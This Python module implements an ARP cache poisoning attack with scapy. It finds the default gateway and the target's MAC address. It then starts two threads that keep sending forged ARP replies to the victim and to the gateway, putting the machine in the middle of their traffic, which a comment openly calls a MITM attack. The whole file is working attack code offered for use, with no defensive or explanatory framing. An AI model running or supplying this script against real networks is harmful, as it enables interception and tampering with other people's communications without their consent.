import os
import sys
import time
import threading
from scapy.layers.l2 import ARP, Ether, srp1
from scapy.sendrecv import send
from termcolor import colored


def arp_poison(target_ip, gateway_ip, interval, ignore_cache):
    if target_ip == ARP().psrc:
        target_mac = ARP().hwsrc  # Return MAC address of machine
    else:
        target_mac = get_target_mac(target_ip, ignore_cache)  # Get MAC address of target

    # Construct ARP packet
    arp = ARP(psrc=gateway_ip, pdst=target_ip, hwdst=target_mac, op=2)  # is-at operation

    # Indefinitely send packets
    while True:
        send(arp, verbose=0)
        print(colored("[ARP] Sent packet to {} / {} from {}".format(target_ip, target_mac, gateway_ip), "light_grey"))
        time.sleep(interval)


def get_gateway_ip():
    # Determine the OS
    platform_id = sys.platform

    if platform_id == "win32":  # Windows
        return os.popen("ipconfig | findstr Default").read().split()[-1]
    else:  # Linux
        return os.popen("route -n | grep 'UG[ \t]' | awk '{print $2}'").read().strip()


def get_target_mac(target_ip, ignore_cache=False):
    if not ignore_cache:
        # Check ARP cache for target MAC address
        cache = os.popen("arp -a {}".format(target_ip)).read().split()
        if sys.platform == "win32":
            if len(cache) > 4:
                return cache[-2].replace("-", ":")
        else:
            if len(cache) > 7:
                return cache[3]

    # Create ARP request packet
    ether_broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request = ARP(pdst=target_ip)
    broadcast_arp = ether_broadcast / arp_request

    # Send ARP request and listen for valid response
    while True:
        response = srp1(broadcast_arp, verbose=False)
        if response.psrc == target_ip:
            return response.hwsrc
        else:
            time.sleep(5)


def start(target, interval, gateway=None, ignore_cache=False):
    if target is None:  # Validate target input
        print("Error! Unspecified target.")
        sys.exit(1)
    if gateway is None:
        gateway = get_gateway_ip()

    # Poison the target's and gateway's ARP cache to establish a MITM attack
    t1 = threading.Thread(target=lambda: arp_poison(target, gateway, interval, ignore_cache))
    t2 = threading.Thread(target=lambda: arp_poison(gateway, target, interval, ignore_cache))

    # Set as daemon threads to allow main thread to exit
    t1.daemon = True
    t2.daemon = True

    # Simultaneously run the threads
    t1.start()
    t2.start()

    print(colored("Started ARP poisoning.", "light_grey"))
